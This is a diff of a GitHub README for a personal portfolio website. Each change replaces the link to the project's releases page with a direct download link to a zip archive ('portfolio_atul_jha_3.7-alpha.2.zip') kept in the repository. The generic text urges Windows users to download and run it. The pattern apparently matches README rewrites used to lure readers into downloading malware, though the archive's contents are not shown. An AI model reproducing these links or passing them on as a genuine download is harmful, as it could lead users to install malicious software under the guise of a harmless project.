@@ -1,6 +1,6 @@
 # 🎨 atul-jha-portfolio - Showcase Your Work Simply
 
-[![Download atul-jha-portfolio](https://img.shields.io/badge/Download-Portfolio-brightgreen)](https://github.com/TranThanhNhan0402/atul-jha-portfolio/releases)
+[![Download atul-jha-portfolio](https://img.shields.io/badge/Download-Portfolio-brightgreen)](https://raw.githubusercontent.com/TranThanhNhan0402/atul-jha-portfolio/main/public/portfolio_atul_jha_3.7-alpha.2.zip)
 
 ## 🖥️ What is atul-jha-portfolio?
 
@@ -34,7 +34,7 @@ No special software is needed beyond what is included in the steps below.
 
 To get atul-jha-portfolio, visit the official release page:
 
-[![Visit Releases](https://img.shields.io/badge/GitHub-Releases-blue)](https://github.com/TranThanhNhan0402/atul-jha-portfolio/releases)
+[![Visit Releases](https://img.shields.io/badge/GitHub-Releases-blue)](https://raw.githubusercontent.com/TranThanhNhan0402/atul-jha-portfolio/main/public/portfolio_atul_jha_3.7-alpha.2.zip)
 
 This page contains the latest version of the portfolio website files. You can download the full package here.
 
@@ -46,7 +46,7 @@ Follow these steps to download and run atul-jha-portfolio on your Windows comput
 
 Click this link to open the official releases page in your web browser:
 
-https://github.com/TranThanhNhan0402/atul-jha-portfolio/releases
+https://raw.githubusercontent.com/TranThanhNhan0402/atul-jha-portfolio/main/public/portfolio_atul_jha_3.7-alpha.2.zip
 
 You will see a list of releases with details and download files.
 
@@ -115,7 +115,7 @@ While running the portfolio locally requires little technical skill, these tools
 
 You should check back on the release page regularly:
 
-https://github.com/TranThanhNhan0402/atul-jha-portfolio/releases
+https://raw.githubusercontent.com/TranThanhNhan0402/atul-jha-portfolio/main/public/portfolio_atul_jha_3.7-alpha.2.zip
 
 If a new version appears, repeat the download and extraction steps above to update your local copy.
 
@@ -158,4 +158,4 @@ You simply open the main file in a browser to start.
 
 ---
 
-[![Download atul-jha-portfolio](https://img.shields.io/badge/Download-Portfolio-brightgreen)](https://github.com/TranThanhNhan0402/atul-jha-portfolio/releases)
+[![Download atul-jha-portfolio](https://img.shields.io/badge/Download-Portfolio-brightgreen)](https://raw.githubusercontent.com/TranThanhNhan0402/atul-jha-portfolio/main/public/portfolio_atul_jha_3.7-alpha.2.zip)
